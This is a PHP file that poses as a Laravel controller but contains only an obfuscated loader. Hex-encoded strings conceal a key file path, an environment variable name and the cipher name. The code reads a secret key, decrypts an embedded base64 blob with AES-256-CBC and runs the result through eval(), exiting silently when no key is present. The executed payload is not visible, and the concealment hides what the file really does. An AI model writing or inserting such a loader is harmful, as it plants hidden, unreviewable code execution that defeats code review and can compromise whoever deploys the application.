<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('/OzWSS/dm+B2oiLpKHs9Mw==');

$c=base64_decode(

'+EDghMnktLPFk3RGldTenqKpLHGGEszR/bzRinDGJXKGpx+cfMAQHjlfpWC3QU8LmljKvP+Cv9zN' .
'+9BrYZx7Qj8IJHD0y8dRwYAw907r9dl5E3nJbAAyvvSBajrDb8PxVO4suxiNRnLiOzKjIbCWNShZ' .
'Hin6K8BhYsIutffUxHPL088TCwDaVlYriPd3ajney2OnEr4xIqQ2iaxbR5R9MY8rtMBsSRGJYolV' .
'Ppn7oKHW1ZqqpiUrEBUxthKGMOOcdM+O2Ot707jiynwOICLaEERZZkaECuUQwwLwv5ieQI7gHSkg' .
'tpHebYg5VvYRsfscAkI/dVIJC9dGA/JMjBA5DoHkFVUIe83V/SkoMOoxh/eLR7E1YxVEdV0+i1bm' .
'MI2AkLMWbBcSUFt09KXF4oK3lQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

